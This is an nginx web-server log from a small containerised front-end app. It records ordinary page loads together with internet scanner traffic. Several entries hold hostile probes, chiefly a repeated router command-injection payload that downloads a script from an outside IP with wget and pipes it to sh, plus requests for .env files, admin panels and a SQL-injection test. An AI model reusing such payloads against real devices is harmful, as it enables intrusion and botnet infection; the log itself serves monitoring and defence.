/docker-entrypoint.sh: /docker-entrypoint.d/ is not empty, will attempt to perform configuration
/docker-entrypoint.sh: Looking for shell scripts in /docker-entrypoint.d/
/docker-entrypoint.sh: Launching /docker-entrypoint.d/10-listen-on-ipv6-by-default.sh
10-listen-on-ipv6-by-default.sh: info: Getting the checksum of /etc/nginx/conf.d/default.conf
10-listen-on-ipv6-by-default.sh: info: /etc/nginx/conf.d/default.conf differs from the packaged version
/docker-entrypoint.sh: Sourcing /docker-entrypoint.d/15-local-resolvers.envsh
/docker-entrypoint.sh: Launching /docker-entrypoint.d/20-envsubst-on-templates.sh
/docker-entrypoint.sh: Launching /docker-entrypoint.d/30-tune-worker-processes.sh
/docker-entrypoint.sh: Configuration complete; ready for start up
2024/11/06 20:44:43 [notice] 19#19: using the "epoll" event method
2024/11/06 20:44:43 [notice] 19#19: nginx/1.27.2
2024/11/06 20:44:43 [notice] 19#19: built by gcc 13.2.1 20240309 (Alpine 13.2.1_git20240309) 
2024/11/06 20:44:43 [notice] 19#19: OS: Linux 5.10.102.2-microsoft-standard
2024/11/06 20:44:43 [notice] 19#19: getrlimit(RLIMIT_NOFILE): 1024:1048576
2024/11/06 20:44:43 [notice] 19#19: start worker processes
2024/11/06 20:44:43 [notice] 19#19: start worker process 46
10.92.0.9 - - [07/Nov/2024:06:31:14 +0000] "GET /app/ HTTP/1.1" 200 459 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15" "-"
10.92.0.9 - - [07/Nov/2024:06:31:15 +0000] "GET /home/ HTTP/1.1" 200 459 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15" "-"
10.92.0.9 - - [07/Nov/2024:06:31:16 +0000] "GET /cas/ HTTP/1.1" 200 459 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15" "-"
10.92.0.10 - - [07/Nov/2024:06:31:17 +0000] "GET /portal/ HTTP/1.1" 200 459 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15" "-"
10.92.0.10 - - [07/Nov/2024:06:31:18 +0000] "GET /sys/ HTTP/1.1" 200 459 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15" "-"
10.92.0.10 - - [07/Nov/2024:06:31:18 +0000] "GET /wiki/ HTTP/1.1" 200 459 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15" "-"
10.92.0.10 - - [07/Nov/2024:06:31:19 +0000] "GET /im/ HTTP/1.1" 200 459 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15" "-"
10.92.0.10 - - [07/Nov/2024:06:31:20 +0000] "GET /spaces/ HTTP/1.1" 200 459 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15" "-"
10.92.0.10 - - [07/Nov/2024:06:31:21 +0000] "GET /homepage/ HTTP/1.1" 200 459 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15" "-"
10.92.0.9 - - [07/Nov/2024:06:31:23 +0000] "GET /default/ HTTP/1.1" 200 459 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15" "-"
10.92.0.9 - - [07/Nov/2024:06:31:24 +0000] "GET /Page/ HTTP/1.1" 200 459 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15" "-"
10.92.0.9 - - [07/Nov/2024:06:31:25 +0000] "POST /never_could_exists HTTP/1.1" 405 157 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15" "-"
10.92.0.9 - - [07/Nov/2024:06:31:26 +0000] "GET /?id=1%20and%201=1 HTTP/1.1" 200 459 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15" "-"
10.92.0.9 - - [07/Nov/2024:06:31:26 +0000] "GET /upnpdev.xml HTTP/1.1" 200 459 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15" "-"
10.92.0.9 - - [07/Nov/2024:06:31:27 +0000] "GET /axis2/never_could_exists.jws HTTP/1.1" 200 459 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15" "-"
10.92.0.9 - - [07/Nov/2024:06:31:29 +0000] "GET /vite.svg HTTP/1.1" 200 1497 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15" "-"
10.92.0.10 - - [07/Nov/2024:06:34:27 +0000] "GET / HTTP/1.1" 200 459 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0" "-"
10.92.0.9 - - [07/Nov/2024:06:35:56 +0000] "GET /webui/ HTTP/1.1" 200 459 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15" "-"
10.92.0.9 - - [07/Nov/2024:06:36:40 +0000] "GET /favicon.ico HTTP/1.1" 200 459 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:124.0) Gecko/20100101 Firefox/124.0" "-"
10.92.0.9 - - [07/Nov/2024:06:37:15 +0000] "GET /geoserver/web/ HTTP/1.1" 200 459 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0" "-"
10.92.0.9 - - [07/Nov/2024:06:39:56 +0000] "GET / HTTP/1.1" 200 459 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 9_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13B143 Safari/601.1" "-"
10.92.0.10 - - [07/Nov/2024:06:45:29 +0000] "GET / HTTP/1.1" 200 459 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36" "-"
10.92.0.10 - - [07/Nov/2024:07:13:16 +0000] "GET /login.rsp HTTP/1.1" 200 459 "-" "Hello World" "-"
10.92.0.9 - - [07/Nov/2024:07:20:08 +0000] "GET / HTTP/1.1" 200 459 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46" "-"
10.92.0.9 - - [07/Nov/2024:07:21:37 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+http%3A%2F%2F45.202.35.24%2Fl+-O-%7C+sh%60) HTTP/1.1" 200 459 "-" "Go-http-client/1.1" "-"
10.92.0.9 - - [07/Nov/2024:07:59:31 +0000] "GET /YcMS HTTP/1.1" 200 459 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:32.0) Gecko/20100101 Firefox/32.0" "-"
10.92.0.9 - - [07/Nov/2024:07:59:31 +0000] "GET /4Krl HTTP/1.1" 200 459 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:32.0) Gecko/20100101 Firefox/32.0" "-"
10.92.0.9 - - [07/Nov/2024:07:59:32 +0000] "GET /aab8 HTTP/1.1" 200 459 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:32.0) Gecko/20100101 Firefox/32.0" "-"
10.92.0.9 - - [07/Nov/2024:07:59:32 +0000] "GET /aab9 HTTP/1.1" 200 459 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:32.0) Gecko/20100101 Firefox/32.0" "-"
10.92.0.9 - - [07/Nov/2024:08:41:00 +0000] "\x03\x00\x00/*\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Administr" 400 157 "-" "-" "-"
10.92.0.9 - - [07/Nov/2024:09:02:41 +0000] "GET / HTTP/1.1" 200 459 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com" "-"
10.92.0.10 - - [07/Nov/2024:09:13:24 +0000] "GET / HTTP/1.0" 200 459 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko" "-"
10.92.0.9 - - [07/Nov/2024:09:19:38 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+http%3A%2F%2F45.202.35.24%2Fl+-O-%7C+sh%60) HTTP/1.1" 200 459 "-" "Go-http-client/1.1" "-"
10.92.0.9 - - [07/Nov/2024:09:21:17 +0000] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03F\x99\x97\x12\xBC\x8D\xF5\xD8,F\xAE\xBB\xDB~\x19\xF2%voKq\xE7\xAC~$\x01\x8A\xB4cY\xAA!\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 157 "-" "-" "-"
10.92.0.9 - - [07/Nov/2024:09:28:32 +0000] "GET / HTTP/1.1" 200 459 "-" "-" "-"
10.92.0.10 - - [07/Nov/2024:10:12:01 +0000] "GET / HTTP/1.1" 200 459 "-" "Mozilla/5.0 zgrab/0.x" "-"
10.92.0.9 - - [07/Nov/2024:10:28:51 +0000] "GET /login.rsp HTTP/1.1" 200 459 "-" "Hello World" "-"
10.92.0.9 - - [07/Nov/2024:10:29:30 +0000] "GET /cdn-cgi/trace HTTP/1.1" 200 459 "-" "Mozilla/5.0" "-"
10.92.0.10 - - [07/Nov/2024:10:29:37 +0000] "\x16\x03\x01\x01\x0B\x01\x00\x01\x07\x03\x03\x81,\x11q\x98\xFBG\xBC\xA8\xDA\xCCX\xC2`\x1C\xCE\x058\xF5O\xAD]\x15\x95)\xDBUnb\xA7\xCC\x83 <\x15\x81-,\xD3d\xC9\xBC;,\x18r\x1E\x17p\xB7\x01QP\x85V,\x8Ck\x01\xBA\xA5\xF7\xFD\xE8\xCC\x00&\xC0+\xC0/\xC0,\xC00\xCC\xA9\xCC\xA8\xC0\x09\xC0\x13\xC0" 400 157 "-" "-" "-"
10.92.0.10 - - [07/Nov/2024:10:29:52 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+http%3A%2F%2F45.202.35.24%2Fl+-O-%7C+sh%60) HTTP/1.1" 200 459 "-" "Go-http-client/1.1" "-"
10.92.0.9 - - [07/Nov/2024:10:39:19 +0000] "GET / HTTP/1.1" 200 459 "-" "-" "-"
10.92.0.9 - - [07/Nov/2024:11:09:40 +0000] "\x00\x0E8\x01\x01\x01\x01\x01\x01\x01\x01\x00\x00\x00\x00\x00" 400 157 "-" "-" "-"
10.92.0.10 - - [07/Nov/2024:11:11:22 +0000] "GET / HTTP/1.1" 200 459 "-" "-" "-"
10.92.0.10 - - [07/Nov/2024:11:27:39 +0000] "\x16\x03\x02\x01o\x01\x00\x01k\x03\x02RH\xC5\x1A#\xF7:N\xDF\xE2\xB4\x82/\xFF\x09T\x9F\xA7\xC4y\xB0h\xC6\x13\x8C\xA4\x1C=\x22\xE1\x1A\x98 \x84\xB4,\x85\xAFn\xE3Y\xBBbhl\xFF(=':\xA9\x82\xD9o\xC8\xA2\xD7\x93\x98\xB4\xEF\x80\xE5\xB9\x90\x00(\xC0" 400 157 "-" "-" "-"
10.92.0.10 - - [07/Nov/2024:11:29:41 +0000] "GET / HTTP/1.0" 200 459 "-" "-" "-"
10.92.0.9 - - [07/Nov/2024:11:37:24 +0000] "H\x00\x00\x00tj\xA8\x9E#D\x98+\xCA\xF0\xA7\xBBl\xC5\x19\xD7\x8D\xB6\x18\xEDJ\x1En\xC1\xF9xu[l\xF0E\x1D-j\xEC\xD4xL\xC9r\xC9\x15\x10u\xE0%\x86Rtg\x05fv\x86]%\xCC\x80\x0C\xE8\xCF\xAE\x00\xB5\xC0f\xC8\x8DD\xC5\x09\xF4" 400 157 "-" "-" "-"
10.92.0.9 - - [07/Nov/2024:11:38:05 +0000] "GET /wsman HTTP/1.1" 200 459 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)" "-"
10.92.0.10 - - [07/Nov/2024:11:46:01 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+http%3A%2F%2F45.202.35.24%2Fl+-O-%7C+sh%60) HTTP/1.1" 200 459 "-" "Go-http-client/1.1" "-"
10.92.0.10 - - [07/Nov/2024:12:09:42 +0000] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\x14\x81\xE8\xB5\xD3\xBBs\xC1\xEB\xA7\xC5s\xE5\xEF\xAB\x19\xFE4\x06\x9E\xB5\xBE" 400 157 "-" "-" "-"
10.92.0.9 - - [07/Nov/2024:12:27:38 +0000] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 200 459 "-" "-" "-"
10.92.0.9 - - [07/Nov/2024:12:27:49 +0000] "GET / HTTP/1.1" 200 459 "-" "-" "-"
10.92.0.10 - - [07/Nov/2024:12:31:02 +0000] "GET / HTTP/1.1" 200 459 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36" "-"
10.92.0.9 - - [07/Nov/2024:12:32:25 +0000] "GET /.env HTTP/1.0" 200 459 "-" "Mozilla/5.0 (Windows NT 6.0; rv:40.0) Gecko/20100101 Firefox/40.0" "-"
10.92.0.9 - - [07/Nov/2024:12:55:59 +0000] "GET /ingredients/add HTTP/1.1" 200 459 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0" "-"
10.92.0.9 - - [07/Nov/2024:12:56:00 +0000] "GET /assets/index-BZjPho-Z.js HTTP/1.1" 200 230980 "http://frontend-app-label.eastus.azurecontainer.io/ingredients/add" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0" "-"
10.92.0.9 - - [07/Nov/2024:12:56:01 +0000] "GET /assets/index-BZjPho-Z.js HTTP/1.1" 200 230980 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0" "-"
10.92.0.9 - - [07/Nov/2024:12:56:13 +0000] "GET /assets/index-BZjPho-Z.js HTTP/1.1" 200 230980 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36" "127.0.0.1"
10.92.0.9 - - [07/Nov/2024:12:56:16 +0000] "GET /ingredients/add HTTP/1.1" 200 459 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36" "127.0.0.1"
10.92.0.9 - - [07/Nov/2024:12:56:20 +0000] "GET /ingredients/react_devtools_backend_compact.js.map HTTP/1.1" 200 459 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0" "-"
10.92.0.9 - - [07/Nov/2024:12:56:20 +0000] "GET /ingredients/installHook.js.map HTTP/1.1" 200 459 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0" "-"
10.92.0.9 - - [07/Nov/2024:12:56:39 +0000] "GET /ingredients/react_devtools_backend_compact.js.map HTTP/1.1" 304 0 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0" "-"
10.92.0.9 - - [07/Nov/2024:13:02:22 +0000] "GET / HTTP/1.1" 200 459 "-" "Mozilla/5.0 zgrab/0.x" "-"
10.92.0.9 - - [07/Nov/2024:13:06:06 +0000] "GET / HTTP/1.1" 200 459 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0" "-"
10.92.0.10 - - [07/Nov/2024:13:06:33 +0000] "GET / HTTP/1.1" 200 459 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36" "127.0.0.1"
10.92.0.10 - - [07/Nov/2024:13:28:45 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+http%3A%2F%2F45.202.35.24%2Fl+-O-%7C+sh%60) HTTP/1.1" 200 459 "-" "Go-http-client/1.1" "-"
10.92.0.10 - - [07/Nov/2024:13:34:32 +0000] "GET / HTTP/1.0" 200 459 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 12_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.2 Mobile/15E148 Safari/604.1" "-"
10.92.0.9 - - [07/Nov/2024:13:35:27 +0000] "GET /manager/html HTTP/1.1" 200 459 "-" "Mozilla/5.0 zgrab/0.x" "-"
10.92.0.9 - - [07/Nov/2024:13:46:50 +0000] "GET / HTTP/1.1" 200 459 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36" "-"
10.92.0.9 - - [07/Nov/2024:13:46:50 +0000] "GET /assets/index-B51d7Tnh.css HTTP/1.1" 200 7789 "http://frontend-app-label.eastus.azurecontainer.io/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36" "-"
10.92.0.9 - - [07/Nov/2024:13:46:50 +0000] "GET /assets/index-BZjPho-Z.js HTTP/1.1" 200 230980 "http://frontend-app-label.eastus.azurecontainer.io/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36" "-"
10.92.0.9 - - [07/Nov/2024:13:46:51 +0000] "GET /vite.svg HTTP/1.1" 200 1497 "http://frontend-app-label.eastus.azurecontainer.io/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36" "-"
10.92.0.9 - - [07/Nov/2024:14:32:59 +0000] "GET /UbAd HTTP/1.1" 200 459 "-" "Go-http-client/1.1" "-"
10.92.0.10 - - [07/Nov/2024:14:33:00 +0000] "\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03$\xE5*>\xF6\x80aX\xD8S\xE5Jw\xDF\x09eH\x09\xBD1\xA2rU\xAC\xC7-\xD9\xCC\xF2\xE4\x5CO e\xED\xB8\xAD\x0FzJx\x94\xA7\xD9\xCF\xCD58\x8CkE\xC9\x9E\x18\xF3%L\xBA\x81\x96#\xE3(\x83Y\x00&\xC0+\xC0/\xC0,\xC00\xCC\xA9\xCC\xA8\xC0\x09\xC0\x13\xC0" 400 157 "-" "-" "-"
10.92.0.10 - - [07/Nov/2024:14:33:00 +0000] "GET /jquery-3.3.1.min.js HTTP/1.1" 200 459 "-" "Go-http-client/1.1" "-"
10.92.0.10 - - [07/Nov/2024:14:33:01 +0000] "\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\xA7z\x96\xC8\xBE\xE5\x8BK~k\x17\xF4\xD9O\x86!\xD3!?.k`\x03\xDD\x1C\xDC\xC1\xE0\xACm\x84i \xB7W\xE0\x86\x87\xED\x89\xE9kOg$t\x12\xACP\xB3\xD8\xA4\x02Y\x135\x91\x17\x12\xF2\xFB\xE48\x96\x8E\x00&\xC0+\xC0/\xC0,\xC00\xCC\xA9\xCC\xA8\xC0\x09\xC0\x13\xC0" 400 157 "-" "-" "-"
10.92.0.9 - - [07/Nov/2024:14:39:06 +0000] "GET / HTTP/1.1" 200 459 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36" "-"
10.92.0.9 - - [07/Nov/2024:14:39:07 +0000] "GET /assets/index-B51d7Tnh.css HTTP/1.1" 200 7789 "http://frontend-app-label.eastus.azurecontainer.io/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36" "-"
10.92.0.9 - - [07/Nov/2024:14:39:07 +0000] "GET /assets/index-BZjPho-Z.js HTTP/1.1" 200 230980 "http://frontend-app-label.eastus.azurecontainer.io/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36" "-"
10.92.0.9 - - [07/Nov/2024:14:39:08 +0000] "GET /vite.svg HTTP/1.1" 200 1497 "http://frontend-app-label.eastus.azurecontainer.io/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36" "-"
10.92.0.9 - - [07/Nov/2024:14:41:12 +0000] "GET / HTTP/1.1" 200 459 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46" "-"
10.92.0.9 - - [07/Nov/2024:14:42:52 +0000] "GET / HTTP/1.1" 200 459 "-" "Mozilla/5.0" "-"
10.92.0.9 - - [07/Nov/2024:14:42:54 +0000] "\x16\x03\x01\x00\xF4\x01\x00\x00\xF0\x03\x03 )5\xF6\xCE\xFB\x8F[\xF8`\xAB\xB1>\xF8\x83Q\xD7&\x0F\xD4}/\x1C\x0Er\xC0\x85L\xDE\xD3Jg \xAB\x85l\x17\x84<2<\x8E\x92xQ,&\x9D\xD9uIH5m\xCC #\xAA\xA3\x8B\xF3\x17\xDDq\xDF\x00&\xCC\xA9\xCC\xA8\xC0+\xC0/\xC0,\xC00\xC0\x09\xC0\x13\xC0" 400 157 "-" "-" "-"
10.92.0.9 - - [07/Nov/2024:14:44:09 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+http%3A%2F%2F45.202.35.91%2Fl+-O-%7C+sh%60) HTTP/1.1" 200 459 "-" "Go-http-client/1.1" "-"
10.92.0.9 - - [07/Nov/2024:14:56:20 +0000] "GET / HTTP/1.1" 200 459 "-" "-" "-"

